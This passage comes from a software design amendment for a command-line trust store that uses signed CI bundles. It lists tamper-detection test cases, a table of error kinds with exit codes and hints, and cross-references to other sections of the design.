*Tests:* delete the keychain item, or unset the session bus: `anchor_unreachable`; roll `trust.json` back one
version: `anchor_head_mismatch`; kill between the two anchor writes and read: accepted via `pending`; init
without keychain and without `--anchor-dir`: `anchor_unavailable`.

### 8. Error kinds

Exit code 2 is a usage error, 3 a trust refusal (T1.0 registers both in the command registry). Each error
prints the kind and the hint.

| Kind | Exit | Hint |
|---|---|---|
| `layout_invalid`, `store_dir_layout_mismatch`, `runner_root_invalid`, `bundle_dir_not_empty`, `expires_invalid` (not a whole number 1 to 90), `ci_pin_invalid` (not `<64 hex>:<uid\|signed>`), `passphrase_too_short` | 2 | name the flag and the rule it broke (`bundle_dir_not_empty`: use `--force-new`) |
| `export_root_outside_project` | 2 | the flows root must lie under its project root |
| `bundle_unsigned`, `bundle_signature_invalid`, `bundle_file_mismatch` | 3 | re-export and re-provision; do not edit a bundle |
| `bundle_fingerprint_mismatch`, `bundle_layout_mismatch` | 3 | compare the pinned fingerprint and layout with the export output |
| `bundle_expired`, `bundle_seq_below_min` | 3 | export a new bundle |
| `ci_pin_missing`, `ci_pin_mismatch` | 3 | pass `--ci-pin <fingerprint>:<layout>` from the organisation variable |
| `store_exists` | 3 | an installed store is never overwritten; remove it by hand |
| `store_writable_in_ci` (details of amendment section 3), `store_unreadable` | 3 | print the detail; fix the provisioning |
| `ledgers_invalid` (details of amendment section 4) | 3 | recreate the directory 0700 owned by the job user, or delete the named ledger file by hand; see amendment section 4 |
| `key_params_weak`, `rotate_unverified`, `rotate_incomplete` | 3 | rerun `trust key rotate-owner` or restore the key file |
| `replace_unverified`, `store_replaced` | 3 | remove the store by hand, or finish step 4 of amendment section 6 |
| `anchor_unavailable` | 3 | pass `--anchor-dir <abs path>` to `trust init` |
| `trust_tampered` with `detail` `anchor_unreachable`, `anchor_head_mismatch` | 3 | restore the anchor, or re-initialise |

### 9. Other places this amendment changes

Body section 1: the `ci` rule is the `uid` layout. Body section 2 `ci` row: `layout`, `bundleId`, `bundleSeq`,
`ownerFingerprint`, `expires`. Body section 3: the `trust add` table gains `trust export --for-ci` (also
writes `exportSeq`) and `trust key rotate-owner`; the dispatch, reserved-name, guarded and `ci`-refusal lists name
`export`, `verify-bundle`, `forget`, `revoke`. The ADR 0024 section 5 item 9 edit (fixed path `<store>/ledgers`,
header line) is for that ADR and is not made here.
